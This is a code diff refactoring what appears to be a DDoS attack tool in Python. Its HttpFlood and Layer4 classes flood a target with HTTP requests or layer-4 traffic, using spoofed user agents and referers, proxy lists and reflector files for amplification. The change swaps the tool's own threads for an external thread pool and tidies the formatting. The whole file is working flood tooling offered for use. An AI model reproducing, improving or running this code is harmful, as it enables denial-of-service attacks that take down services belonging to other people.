@@ -127,7 +127,6 @@ class Tools:
     def humanbits(i: int):
         MULTIPLES = ["Bit", "kBit", "MBit", "GBit"]
         if i > 0:
-            i *= 8
             base = 1024
             multiple = trunc(log2(i) / log2(base))
             value = i / pow(base, multiple)
@@ -294,7 +293,7 @@ class Minecraft:
 
 
 # noinspection PyBroadException,PyUnusedLocal
-class Layer4(Thread):
+class Layer4:
     _method: str
     _target: Tuple[str, int]
     _ref: Any
@@ -311,7 +310,6 @@ class Layer4(Thread):
                  REQUESTS_SENT,
                  BYTES_SEND,
                  ):
-        Thread.__init__(self, daemon=True)
         self._amp_payload = None
         self._amp_payloads = cycle([])
         self._ref = ref
@@ -535,7 +533,7 @@ class Layer4(Thread):
 
 
 # noinspection PyBroadException,PyUnusedLocal
-class HttpFlood(Thread):
+class HttpFlood:
     _proxies: List[Proxy] = None
     _payload: str
     _defaultpayload: Any
@@ -560,7 +558,6 @@ class HttpFlood(Thread):
                  proxies: Set[Proxy],
                  REQUESTS_SENT,
                  BYTES_SEND) -> None:
-        Thread.__init__(self, daemon=True)
         self.SENT_FLOOD = None
         self._thread_id = thread_id
         self._synevent = synevent
@@ -1024,9 +1021,7 @@ class HttpFlood(Thread):
         if name == "KILLER": self.SENT_FLOOD = self.KILLER
 
 
-def main(url, ip, method, threads, timer, proxy_fn=None, rpc=None, refl_li_fn=None, statistics=None, sock_timeout=5):
-    event = Event()
-    event.clear()
+def main(url, ip, method, threads, event, thread_pool, proxy_fn=None, rpc=None, refl_li_fn=None, statistics=None, sock_timeout=5):
     REQUESTS_SENT = statistics['requests']
     BYTES_SEND = statistics['bytes']
     global SOCK_TIMEOUT
@@ -1059,17 +1054,25 @@ def main(url, ip, method, threads, timer, proxy_fn=None, rpc=None, refl_li_fn=No
         if not referers_li.exists():
             exit("The Referer file doesn't exist ")
 
-        uagents = set(a.strip()
-                      for a in useragent_li.open("r+").readlines())
-        referers = set(a.strip()
-                       for a in referers_li.open("r+").readlines())
+        uagents = set(
+            a.strip()
+            for a in useragent_li.open("r+").readlines()
+        )
+        referers = set(
+            a.strip()
+            for a in referers_li.open("r+").readlines()
+        )
 
-        if not uagents: exit("Empty Useragent File ")
-        if not referers: exit("Empty Referer File ")
+        if not uagents:
+            exit("Empty Useragent File ")
+        if not referers:
+            exit("Empty Referer File ")
 
         for thread_id in range(threads):
-            HttpFlood(thread_id, url, ip, method, rpc, event,
-                      uagents, referers, proxies, REQUESTS_SENT, BYTES_SEND).start()
+            thread_pool.submit(
+                HttpFlood(thread_id, url, ip, method, rpc, event,
+                          uagents, referers, proxies, REQUESTS_SENT, BYTES_SEND).run
+            )
 
     if method in Methods.LAYER4_METHODS:
         port = url.port
@@ -1086,20 +1089,15 @@ def main(url, ip, method, threads, timer, proxy_fn=None, rpc=None, refl_li_fn=No
             refl_li = Path(__dir__ / "files" / refl_li_fn)
             if not refl_li.exists():
                 exit("The reflector file doesn't exist")
-            ref = set(a.strip()
-                      for a in ProxyTools.Patterns.IP.findall(
-                refl_li.open("r+").read()))
-            if not ref: exit("Empty Reflector File ")
+            ref = set(
+                a.strip()
+                for a in ProxyTools.Patterns.IP.findall(refl_li.open("r+").read())
+            )
+            if not ref:
+                exit("Empty Reflector File ")
 
         for _ in range(threads):
-            Layer4((ip, port), ref, method, event,
-                   proxies, REQUESTS_SENT, BYTES_SEND).start()
-
-    event.set()
-    sleep(timer)
-    event.clear()
-    exit()
-
-
-if __name__ == '__main__':
-    main(*sys.argv)
+            thread_pool.submit(
+                Layer4((ip, port), ref, method, event,
+                       proxies, REQUESTS_SENT, BYTES_SEND).run
+            )
